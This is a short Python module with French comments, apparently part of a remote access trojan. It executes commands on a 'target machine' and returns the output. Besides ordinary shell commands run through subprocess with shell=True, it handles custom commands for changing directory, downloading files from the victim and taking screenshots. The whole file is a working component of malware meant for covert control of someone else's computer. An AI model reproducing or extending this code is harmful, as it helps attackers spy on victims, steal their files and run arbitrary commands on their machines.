# Pour executer les commandes de l'invites de commande de la machine cible

import subprocess
import customCommand


def execution(cmd):
    cmd_split = cmd.split(" ")
    if len(cmd_split) > 1:
        if cmd_split[0] == "cd":     # changer de repertoire
            repertoire = " ".join(cmd_split[1:])     # au cas ou il ya des espaces dans le nom du repertoire
            return customCommand.cd(repertoire)
        elif cmd_split[0] == "dl":   # telecharger un fichier
            nom_de_fichier = " ".join(cmd_split[1:])     # au cas ou il ya des espaces dans le nom du fichier
            return customCommand.dl(nom_de_fichier)
        elif cmd_split[0] == "screenshot":      # faire des capture d'ecran
            nom_image = " ".join(cmd_split[1:])
            return customCommand.screenshot(nom_image)

    # pour des commandes classique on execute directement
    resultat = subprocess.run(cmd, shell=True, capture_output=True, universal_newlines=True)
    if resultat.returncode == 0:  # si la commande s'est executee sans probleme
        return resultat.stdout    # sortie standard
    # en cas de probleme on affiche la sortie d'erreur
    return resultat.stderr    # sortie d'erreur
